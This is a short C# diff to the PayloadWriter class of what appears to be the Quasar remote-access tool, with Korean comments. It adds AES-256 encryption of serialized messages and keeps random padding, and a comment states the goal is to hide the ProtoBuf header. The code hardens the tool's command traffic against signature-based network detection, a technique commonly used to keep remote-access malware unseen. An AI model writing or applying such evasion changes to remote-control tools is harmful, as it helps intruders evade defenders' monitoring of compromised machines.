@@ -1,4 +1,5 @@
 ﻿using ProtoBuf;
+using Quasar.Common.Cryptography;
 using Quasar.Common.Messages;
 using System;
 using System.IO;
@@ -8,12 +9,14 @@ namespace Quasar.Common.Networking
     public class PayloadWriter : MemoryStream
     {
         private readonly Stream _innerStream;
+        private readonly Aes256 _aes;
         public bool LeaveInnerStreamOpen { get; }
 
-        public PayloadWriter(Stream stream, bool leaveInnerStreamOpen)
+        public PayloadWriter(Stream stream, bool leaveInnerStreamOpen, string encryptionKey)
         {
             _innerStream = stream;
             LeaveInnerStreamOpen = leaveInnerStreamOpen;
+            _aes = new Aes256(encryptionKey); // 키로 초기화
         }
 
         public void WriteBytes(byte[] value)
@@ -36,23 +39,25 @@ namespace Quasar.Common.Networking
             using (MemoryStream ms = new MemoryStream())
             {
                 Serializer.Serialize(ms, message);
-                byte[] payload = ms.ToArray();
+                byte[] rawPayload = ms.ToArray();
+
+                // [핵심] ProtoBuf 헤더를 숨기기 위해 전체 페이로드 암호화
+                // 이 과정을 거치면 rawPayload.Length + 48바이트(HMAC+IV)가 됩니다.
+                byte[] encryptedPayload = _aes.Encrypt(rawPayload);
 
                 Random rnd = new Random();
-                int paddingSize = rnd.Next(1, 129); // 1~128바이트 가변 패딩
+                int paddingSize = rnd.Next(1, 129);
                 byte[] padding = new byte[paddingSize];
                 rnd.NextBytes(padding);
 
-                // [중요] 전체 본문 길이 = 패딩크기정보(1B) + 패딩데이터 + 실제데이터
-                int totalBodyLength = 1 + paddingSize + payload.Length;
+                // 전체 본문 길이 업데이트 (암호화된 본문 기준)
+                int totalBodyLength = 1 + paddingSize + encryptedPayload.Length;
 
-                // 1. 하부 엔진용 4바이트 헤더 기록 (전체 데이터 덩어리 크기)
-                WriteInteger(totalBodyLength);
+                WriteInteger(totalBodyLength); // 하부 엔진 헤더
 
-                // 2. 내부 구조 기록 (순서가 매우 중요함)
-                _innerStream.WriteByte((byte)paddingSize); // 첫 바이트에 패딩 크기 기록
-                _innerStream.Write(padding, 0, padding.Length); // 실제 패딩 데이터
-                _innerStream.Write(payload, 0, payload.Length); // 진짜 메시지 본문
+                _innerStream.WriteByte((byte)paddingSize);
+                _innerStream.Write(padding, 0, padding.Length);
+                _innerStream.Write(encryptedPayload, 0, encryptedPayload.Length); // 암호화된 데이터 기록
 
                 return 4 + totalBodyLength;
             }
